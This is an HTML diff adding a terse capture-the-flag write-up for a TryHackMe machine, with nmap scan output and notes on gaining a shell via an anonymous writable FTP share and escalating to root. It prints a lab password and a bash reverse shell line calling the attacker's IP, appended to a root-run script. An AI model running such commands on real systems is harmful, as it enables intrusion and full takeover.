@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>test | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">writeups</span>
+                <span>// YYYY-MM-DD</span>
+                <span>// ID: REF-test</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">test</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- ctf, pentest, linux -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <h1>Raw Dump Area</h1>
+<p><strong>Target IP</strong>: 10.10.10.x<br />
+<strong>Platform</strong>:  TryHackMe</p>
+<hr />
+<!-- PASTE YOUR RAW LOGS AND NOTES BELOW THIS LINE -->
+
+<div class="codehilite"><pre><span></span><code><span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span>
+<span class="nt">21</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ftp</span><span class="w">     </span><span class="nt">vsftpd</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">3</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ftp-syst</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nt">STAT</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w"> </span><span class="nt">FTP</span><span class="w"> </span><span class="nt">server</span><span class="w"> </span><span class="nt">status</span><span class="o">:</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">Connected</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">10</span><span class="p">.</span><span class="nc">21</span><span class="p">.</span><span class="nc">16</span><span class="p">.</span><span class="nc">42</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">Logged</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">as</span><span class="w"> </span><span class="nt">ftp</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">TYPE</span><span class="o">:</span><span class="w"> </span><span class="nt">ASCII</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">No</span><span class="w"> </span><span class="nt">session</span><span class="w"> </span><span class="nt">bandwidth</span><span class="w"> </span><span class="nt">limit</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">Session</span><span class="w"> </span><span class="nt">timeout</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">seconds</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">300</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">Control</span><span class="w"> </span><span class="nt">connection</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">plain</span><span class="w"> </span><span class="nt">text</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">Data</span><span class="w"> </span><span class="nt">connections</span><span class="w"> </span><span class="nt">will</span><span class="w"> </span><span class="nt">be</span><span class="w"> </span><span class="nt">plain</span><span class="w"> </span><span class="nt">text</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">At</span><span class="w"> </span><span class="nt">session</span><span class="w"> </span><span class="nt">startup</span><span class="o">,</span><span class="w"> </span><span class="nt">client</span><span class="w"> </span><span class="nt">count</span><span class="w"> </span><span class="nt">was</span><span class="w"> </span><span class="nt">5</span>
+<span class="o">|</span><span class="w">      </span><span class="nt">vsFTPd</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">3</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">secure</span><span class="o">,</span><span class="w"> </span><span class="nt">fast</span><span class="o">,</span><span class="w"> </span><span class="nt">stable</span>
+<span class="o">|</span><span class="nt">_End</span><span class="w"> </span><span class="nt">of</span><span class="w"> </span><span class="nt">status</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ftp-anon</span><span class="o">:</span><span class="w"> </span><span class="nt">Anonymous</span><span class="w"> </span><span class="nt">FTP</span><span class="w"> </span><span class="nt">login</span><span class="w"> </span><span class="nt">allowed</span><span class="w"> </span><span class="o">(</span><span class="nt">FTP</span><span class="w"> </span><span class="nt">code</span><span class="w"> </span><span class="nt">230</span><span class="o">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">drwxrwxrwx</span><span class="w">    </span><span class="nt">2</span><span class="w"> </span><span class="nt">65534</span><span class="w">    </span><span class="nt">65534</span><span class="w">        </span><span class="nt">4096</span><span class="w"> </span><span class="nt">Nov</span><span class="w"> </span><span class="nt">12</span><span class="w">  </span><span class="nt">2020</span><span class="w"> </span><span class="nt">ftp</span><span class="w"> </span><span class="cp">[</span><span class="nx">NSE</span><span class="p">:</span><span class="w"> </span><span class="nx">writeable</span><span class="cp">]</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">-rw-r--r--</span><span class="w">    </span><span class="nt">1</span><span class="w"> </span><span class="nt">0</span><span class="w">        </span><span class="nt">0</span><span class="w">          </span><span class="nt">251631</span><span class="w"> </span><span class="nt">Nov</span><span class="w"> </span><span class="nt">12</span><span class="w">  </span><span class="nt">2020</span><span class="w"> </span><span class="nt">important</span><span class="p">.</span><span class="nc">jpg</span>
+<span class="o">|</span><span class="nt">_-rw-r--r--</span><span class="w">    </span><span class="nt">1</span><span class="w"> </span><span class="nt">0</span><span class="w">        </span><span class="nt">0</span><span class="w">             </span><span class="nt">208</span><span class="w"> </span><span class="nt">Nov</span><span class="w"> </span><span class="nt">12</span><span class="w">  </span><span class="nt">2020</span><span class="w"> </span><span class="nt">notice</span><span class="p">.</span><span class="nc">txt</span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">2p2</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu2</span><span class="p">.</span><span class="nc">10</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">b9</span><span class="p">:</span><span class="nd">a6</span><span class="p">:</span><span class="nd">0b</span><span class="p">:</span><span class="nd">84</span><span class="p">:</span><span class="nd">1d</span><span class="p">:</span><span class="nd">22</span><span class="p">:</span><span class="nd">01</span><span class="p">:</span><span class="nd">a4</span><span class="p">:</span><span class="nd">01</span><span class="p">:</span><span class="nd">30</span><span class="p">:</span><span class="nd">48</span><span class="p">:</span><span class="nd">43</span><span class="p">:</span><span class="nd">61</span><span class="p">:</span><span class="nd">2b</span><span class="p">:</span><span class="nd">ab</span><span class="p">:</span><span class="nd">94</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span>
+<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">ec</span><span class="p">:</span><span class="nd">13</span><span class="p">:</span><span class="nd">25</span><span class="p">:</span><span class="nd">8c</span><span class="p">:</span><span class="nd">18</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">36</span><span class="p">:</span><span class="nd">e6</span><span class="p">:</span><span class="nd">ce</span><span class="p">:</span><span class="nd">91</span><span class="p">:</span><span class="nd">0e</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">26</span><span class="p">:</span><span class="nd">eb</span><span class="p">:</span><span class="nd">a2</span><span class="p">:</span><span class="nd">be</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span>
+<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">a2</span><span class="p">:</span><span class="nd">ff</span><span class="p">:</span><span class="nd">2a</span><span class="p">:</span><span class="nd">72</span><span class="p">:</span><span class="nd">81</span><span class="p">:</span><span class="nd">aa</span><span class="p">:</span><span class="nd">a2</span><span class="p">:</span><span class="nd">9f</span><span class="p">:</span><span class="nd">55</span><span class="p">:</span><span class="nd">a4</span><span class="p">:</span><span class="nd">dc</span><span class="p">:</span><span class="nd">92</span><span class="p">:</span><span class="nd">23</span><span class="p">:</span><span class="nd">e6</span><span class="p">:</span><span class="nd">b4</span><span class="p">:</span><span class="nd">3f</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">18</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
+<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">18</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span>
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Maintenance</span>
+<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OSs</span><span class="o">:</span><span class="w"> </span><span class="nt">Unix</span><span class="o">,</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span><span class="o">.</span>
+</code></pre></div>
+
+<p>In ftp has something important and notice wia gobuster subdir <code>files</code> and nootice it has ftp files in parent dir so i put reverse shell to ftp and move to ftp dir and run it wia web browser and get reverse shell and find first recipe in shell </p>
+<p><code>c4ntg3t3n0ughsp1c3</code> using this pwd login as a sudo lennie,</p>
+<p>after running linumsh find root running sh so i put bash reverse shell into this </p>
+<div class="codehilite"><pre><span></span><code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.9.0.218/8888 0&gt;&amp;1&quot; &gt;&gt; /etc/print.sh 
+</code></pre></div>
+
+<p>and after excutable i got root shell</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
